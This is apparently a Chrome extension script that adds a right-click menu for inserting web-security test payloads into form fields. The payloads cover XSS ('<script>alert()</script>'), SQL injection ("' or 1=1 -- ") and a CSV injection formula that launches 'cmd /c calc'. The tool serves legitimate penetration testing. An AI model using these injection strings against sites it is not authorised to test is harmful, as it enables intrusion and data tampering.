// The onClicked callback function.
function onClickHandler(info, tab) {
    //For CSV injection and such that require " and '
    var id = info.menuItemId.replace(/'/g, "\\'").replace(/"/g, '\\"');
    //Insert the value into the currently selected text field
    chrome.tabs.executeScript({
        code: 'document.activeElement.value +=\'' + id + '\''
    })
};

chrome.contextMenus.onClicked.addListener(onClickHandler);

// Set up context menu tree at install time.
chrome.runtime.onInstalled.addListener(function() {
    //Top level menus
    createContext('XSS');
    createContext('SQLi');
    createContext('CSVi');
    //Sub menus
    createContext('<b>test</b>', 'XSS');
    createContext('<script>alert()</script>', 'XSS');
    createContext('\' or 1=1 -- ', 'SQLi');
    createContext('\' and 1=2 -- ', 'SQLi');
    createContext("\",=cmd|\'/c calc\'!\'c3\',\"", 'CSVi');
});

//Payload will be the title value
//If it's a child menu the parent id must be passed in
function createContext(title, parent) {
    if (parent) {
        chrome.contextMenus.create({
            "title": title,
            "parentId": parent,
            "id": title,
            "contexts": ['editable']
        });
    } else {

        chrome.contextMenus.create({
            "title": title,
            "id": title,
            "contexts": ['editable']
        });
    }
}
